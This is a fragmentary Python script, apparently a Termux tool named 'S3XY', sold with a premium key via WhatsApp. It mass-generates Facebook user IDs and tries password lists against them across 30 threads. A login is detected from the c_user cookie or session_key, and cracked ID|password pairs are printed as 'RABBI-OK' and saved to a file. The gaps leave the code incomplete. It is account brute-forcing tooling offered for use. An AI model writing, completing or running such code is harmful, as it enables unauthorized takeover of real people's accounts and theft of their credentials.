...
os.system('XD-open https://chat.whatsapp.com/L466zImLlxfG6Ctq09brjB')
print('\n\033[1;33m install modules...\n It will take some seconds...')
...
\033[1;92m
----------------------------------------------
 Author    : MD RABBI HASSAN
 Github    : RABBI-HASSAN-007
 Facebook  : MD RABBI HASSAN
 Tool Name : S3XY
 Type Status : FREE
 Version   : 1.0.0
----------------------------------------------
 RABBI Pro version 1.0.0
 Dad Of All: Reall Dad Of Haters RABBI
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if RABBI in ['1','01']:
                                ...
                                wx=('L466zImLlxfG6Ctq09brjB')
                                os.system(f'XD-open https://chat.whatsapp.com/L466zImLlxfG6Ctq09brjB ');menu()
                        elif RABBI in ['7','07']:
                                os.system('XD-open https://www.facebook.com/profile.php?id=100005209785902');menu()
                        elif RABBI in ['8','08']:
                                os.system('XD-open https://www.facebook.com/100093952621830/posts/pfbid02h5vkCFoQL1S4PFVVW8Mdg4o92UmdNbnLRu3KSbEEWVf8AWrrzKqtVbJbKYyWCT36l/');menu()
                        elif RABBI in ['0','00']:
                                exit(' Thanks for use  ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801641763215&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi RABBI Sir, I Need To Buy Your Paid RABBI PRO Tools Version 1.0.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python RABBI.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as RABBI:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                RABBI.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: Umar, ali, Salman, Ayan\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: Umar, Salman, ali \033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [RABBI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        RABBI=session.cookies.get_dict().keys()
                        if "c_user" in RABBI:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                print('\r\r\033[1;32m [RABBI-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/RABBI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
